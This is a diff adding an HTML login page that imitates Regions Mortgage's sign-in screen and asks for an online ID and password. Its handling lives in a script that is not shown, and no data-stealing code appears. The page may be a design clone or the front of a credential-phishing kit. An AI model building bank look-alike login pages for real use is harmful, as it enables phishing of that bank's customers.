@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mainM">
+        <img src="/assets/equality.jfif" alt="" id="center-logo">
+        <img src="/assets/blog1.png" alt="" id="center-img">
+    </div>
+    <div class="main">
+        <div class="form">
+            <div class="header">
+                <div class="header-img">
+                    <img src="/assets/equality.jfif" alt="" id="logo">
+                    <div class="logo-text">
+                        <h2>REGIONS</h2>
+                        <h3>Mortgage</h3>
+                    </div>
+                </div>
+                <div class="popup">
+                    <a href="#">Are you a new customer?</a>
+                    <button id="enroll">Enroll Now</button>
+                    <div id="popuptext">
+                        <ul>
+                            <li><p >One</p></li>
+                            <li><p >Two</p></li>
+                            <li><p >Three</p></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="login-section">
+                <h2>Welcome back</h2>
+                <p>Sign into your Regions MyMortgage account</p>
+
+                <form class="login-form" id="loginForm">
+                    <div class="input-container">
+                        <input type="text" id="onlineID" placeholder=" " required>
+                        <label for="onlineID">Online ID</label>
+                    </div>
+                    <div class="input-container">
+                        <input type="password" id="password" placeholder=" " required>
+                        <label for="password">Password</label>
+                    </div>
+                
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                
+                    <button type="button" class="login-button" id="loginButton" disabled>Login</button>
+                    <button type="button" class="loading-button" style="display:none;">
+                        <div class="spinner"></div>
+                    </button>
+
+                    <div class="forgot-links">
+                        <a href="#">Forgot Online ID?</a>
+                        <a href="#">Forgot Password?</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="image">
+            <!-- <img src="/assets/blog1.png" alt=""> -->
+        </div>
+    </div>
+
+    <script src="/script.js"></script>
+</body>
+</html>
